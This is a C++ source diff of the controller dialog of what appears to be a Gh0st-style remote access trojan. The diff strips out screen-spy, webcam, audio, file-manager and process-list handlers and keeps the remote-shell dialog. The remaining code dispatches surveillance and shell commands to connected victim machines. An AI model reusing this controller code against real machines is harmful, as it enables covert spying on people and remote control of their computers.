@@ -9,12 +9,6 @@
 #include "afxdialogex.h"
 #include "CSettingDlg.h"
 #include "CShellDlg.h"
-#include "CSystemDlg.h"
-#include "CScreenSpyDlg.h"
-#include "FileManagerDlg.h"
-#include "AudioDlg.h"
-#include "WebCamDlg.h"
-
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -84,7 +78,6 @@ public:
 // 实现
 protected:
 	DECLARE_MESSAGE_MAP()
-
 };
 
 CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
@@ -98,7 +91,6 @@ void CAboutDlg::DoDataExchange(CDataExchange* pDX)
 
 BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
 	
-
 END_MESSAGE_MAP()
 
 
@@ -155,12 +147,6 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
-	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
-	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
-	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
-	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
-	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
-
 END_MESSAGE_MAP()
 
 
@@ -171,9 +157,9 @@ void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, 
 	//::MessageBox(NULL, "有连接到来!!", "", NULL);
 	try
 	{
-		//CString str;
-		//str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
-		//g_PCRemote->m_wndStatusBar.SetPaneText(1, str);
+		CString str;
+		str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
+		g_PCRemote->m_wndStatusBar.SetPaneText(1, str);
 
 		switch (nCode)
 		{
@@ -185,7 +171,7 @@ void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, 
 		case NC_TRANSMIT:
 			break;
 		case NC_RECEIVE:
-			ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收
+			//ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收
 			break;
 		case NC_RECEIVE_COMPLETE:
 			ProcessReceiveComplete(pContext);       //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete
@@ -558,8 +544,6 @@ void CPCRemoteDlg::OnNMRClickOnline(NMHDR* pNMHDR, LRESULT* pResult)
 void CPCRemoteDlg::OnOnlineAudio()
 {
 	// TODO: 在此添加命令处理程序代码
-	BYTE	bToken = COMMAND_AUDIO;
-	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -575,24 +559,18 @@ void CPCRemoteDlg::OnOnlineCmd()
 void CPCRemoteDlg::OnOnlineDesktop()
 {
 	// TODO: 在此添加命令处理程序代码
-	BYTE	bToken = COMMAND_SCREEN_SPY;  //向服务端发送COMMAND_SCREEN_SPY CKernelManager::OnReceive搜之
-	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
 void CPCRemoteDlg::OnOnlineFile()
 {
 	// TODO: 在此添加命令处理程序代码
-	BYTE	bToken = COMMAND_LIST_DRIVE;
-	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
 void CPCRemoteDlg::OnOnlineProcess()
 {
 	// TODO: 在此添加命令处理程序代码
-	BYTE	bToken = COMMAND_SYSTEM;
-	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -605,16 +583,12 @@ void CPCRemoteDlg::OnOnlineServer()
 void CPCRemoteDlg::OnOnlineVideo()
 {
 	// TODO: 在此添加命令处理程序代码
-	BYTE	bToken = COMMAND_WEBCAM;
-	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
 void CPCRemoteDlg::OnOnlineWindow()
 {
 	// TODO: 在此添加命令处理程序代码
-	BYTE	bToken = COMMAND_WSLIST;
-	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -636,22 +610,13 @@ void CPCRemoteDlg::OnOnlineDelete()
 {
 	// TODO: 在此添加命令处理程序代码
 	CString strIP;
-
-	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition();
-	while (pos)
-	{
-		int iSelect = m_CList_Online.GetNextSelectedItem(pos);
-	
-		strIP = m_CList_Online.GetItemText(iSelect, ONLINELIST_IP);
-		strIP += "-";
-		strIP += m_CList_Online.GetItemText(iSelect, ONLINELIST_COMPUTER_NAME);
-		m_CList_Online.DeleteItem(iSelect);
-		strIP += " 主机断开连接";
-		ShowMessage(true, strIP);
-
-	}
-
-	
+	int iSelect = m_CList_Online.GetSelectionMark();
+	strIP = m_CList_Online.GetItemText(iSelect, ONLINELIST_IP);
+	strIP += "-";
+	strIP += m_CList_Online.GetItemText(iSelect, ONLINELIST_COMPUTER_NAME);
+	m_CList_Online.DeleteItem(iSelect);
+	strIP += " 主机断开连接";
+	ShowMessage(true, strIP);
 }
 
 
@@ -812,24 +777,24 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	{
 		switch (pContext->m_Dialog[0])
 		{
-		case FILEMANAGER_DLG:
-			((CFileManagerDlg*)dlg)->OnReceiveComplete();
-			break;
-		case SCREENSPY_DLG:
-			((CScreenSpyDlg*)dlg)->OnReceiveComplete();
-			break;
-		case WEBCAM_DLG:
-			((CWebCamDlg*)dlg)->OnReceiveComplete();
-			break;
-		case AUDIO_DLG:
-			((CAudioDlg*)dlg)->OnReceiveComplete();
-			break;
+	//	case FILEMANAGER_DLG:
+	//		((CFileManagerDlg*)dlg)->OnReceiveComplete();
+	//		break;
+	//	case SCREENSPY_DLG:
+	//		((CScreenSpyDlg*)dlg)->OnReceiveComplete();
+	//		break;
+	//	case WEBCAM_DLG:
+	//		((CWebCamDlg*)dlg)->OnReceiveComplete();
+	//		break;
+	//	case AUDIO_DLG:
+	//		((CAudioDlg*)dlg)->OnReceiveComplete();
+	//		break;
 	//	case KEYBOARD_DLG:
 	//		((CKeyBoardDlg*)dlg)->OnReceiveComplete();
 	//		break;
-		case SYSTEM_DLG:
-			((CSystemDlg*)dlg)->OnReceiveComplete();
-			break;
+	//	case SYSTEM_DLG:
+	//		((CSystemDlg*)dlg)->OnReceiveComplete();
+	//		break;
 		case SHELL_DLG:
 			((CShellDlg*)dlg)->OnReceiveComplete();
 			break;
@@ -849,6 +814,7 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	//	BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
 	//	m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 	//}
+
 	//break;
 	case TOKEN_LOGIN: // 上线包
 
@@ -869,27 +835,26 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	}
 
 	break;
-	case TOKEN_DRIVE_LIST: // 驱动器列表
-		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
-		g_PCRemote->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
-		break;
-	case TOKEN_BITMAPINFO: //
-		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
-		g_PCRemote->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
-		break;
-	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
-		g_PCRemote->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
-		break;
-	case TOKEN_AUDIO_START: // 语音
-		g_PCRemote->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
-		break;
+	//case TOKEN_DRIVE_LIST: // 驱动器列表
+	//	// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
+	//	g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+	//	break;
+	//case TOKEN_BITMAPINFO: //
+	//	// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
+	//	g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
+	//	break;
+	//case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
+	//	g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
+	//	break;
+	//case TOKEN_AUDIO_START: // 语音
+	//	g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
+	//	break;
 	//case TOKEN_KEYBOARD_START:
 	//	g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 	//	break;
-	case TOKEN_WSLIST:  //意思就是进程管理，窗口管理都弹出一个对话框
-	case TOKEN_PSLIST:
-		g_PCRemote->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
-		break;
+	//case TOKEN_PSLIST:
+	//	g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+	//	break;
 	case TOKEN_SHELL_START:		
 		  g_PCRemote->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);//::MessageBox(0,"发送弹出SHELL窗消息",0,0);
 		break;
@@ -1042,19 +1007,6 @@ LRESULT CPCRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 	pContext->m_Dialog[1] = (int)dlg;
 	return 0;
 }
-LRESULT CPCRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
-{
-	ClientContext* pContext = (ClientContext*)lParam;
-	CSystemDlg* dlg = new CSystemDlg(this, m_iocpServer, pContext);
-
-	// 设置父窗口为卓面
-	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
-	dlg->ShowWindow(SW_SHOW);
-
-	pContext->m_Dialog[0] = SYSTEM_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
-	return 0;
-}
 
 
 LRESULT CPCRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
@@ -1073,9 +1025,9 @@ LRESULT CPCRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 			if (pContext == (ClientContext*)m_CList_Online.GetItemData(i))
 			{				
 				
-				strIP = m_CList_Online.GetItemText(i, ONLINELIST_COMPUTER_NAME);
+				strIP = m_CList_Online.GetItemText(i, ONLINELIST_IP);
 				strIP += "-";
-				strIP += m_CList_Online.GetItemText(i, ONLINELIST_IP); 
+				strIP += m_CList_Online.GetItemText(i, ONLINELIST_COMPUTER_NAME);
 				m_CList_Online.DeleteItem(i);
 				strIP += " 主机断开连接";
 				ShowMessage(true, strIP);
@@ -1104,89 +1056,4 @@ LRESULT CPCRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 	}
 	catch (...) {}
 	return 0;
-}
-
-LRESULT CPCRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
-{
-
-	ClientContext* pContext = (ClientContext*)lParam;
-
-	CFileManagerDlg* dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
-	// 设置父窗口为卓面
-	dlg->Create(IDD_FILE, GetDesktopWindow());
-	dlg->ShowWindow(SW_SHOW);
-
-	pContext->m_Dialog[0] = FILEMANAGER_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
-
-	return 0;
-}
-
-LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
-{
-	ClientContext* pContext = (ClientContext*)lParam;
-
-	CScreenSpyDlg* dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
-	// 设置父窗口为卓面
-	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
-	dlg->ShowWindow(SW_SHOW);
-
-	pContext->m_Dialog[0] = SCREENSPY_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
-	return 0;
-}
-
-LRESULT CPCRemoteDlg::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
-{
-	ClientContext* pContext = (ClientContext*)lParam;
-	CWebCamDlg* dlg = new CWebCamDlg(this, m_iocpServer, pContext);
-	// 设置父窗口为卓面
-	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
-	dlg->ShowWindow(SW_SHOW);
-	pContext->m_Dialog[0] = WEBCAM_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
-	return 0;
-}
-
-LRESULT CPCRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
-{
-	ClientContext* pContext = (ClientContext*)lParam;
-	CAudioDlg* dlg = new CAudioDlg(this, m_iocpServer, pContext);
-	// 设置父窗口为卓面
-	dlg->Create(IDD_AUDIO, GetDesktopWindow());
-	dlg->ShowWindow(SW_SHOW);
-	pContext->m_Dialog[0] = AUDIO_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
-	return 0;
-}
-
-
-
-void CPCRemoteDlg::ProcessReceive(ClientContext* pContext)
-{
-	// TODO: 在此处添加实现代码.
-	if (pContext == NULL)
-		return;
-	// 如果管理对话框打开，交给相应的对话框处理
-	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];
-
-	// 交给窗口处理
-	if (pContext->m_Dialog[0] > 0)
-	{
-		switch (pContext->m_Dialog[0])
-		{
-		case SCREENSPY_DLG:
-			((CScreenSpyDlg*)dlg)->OnReceive();
-			break;
-		case WEBCAM_DLG:
-			//((CWebCamDlg*)dlg)->OnReceive();
-			break;
-		case AUDIO_DLG:
-			//((CAudioDlg*)dlg)->OnReceive();
-			break;
-		default:
-			break;
-		}
-		return;
-	}
 }
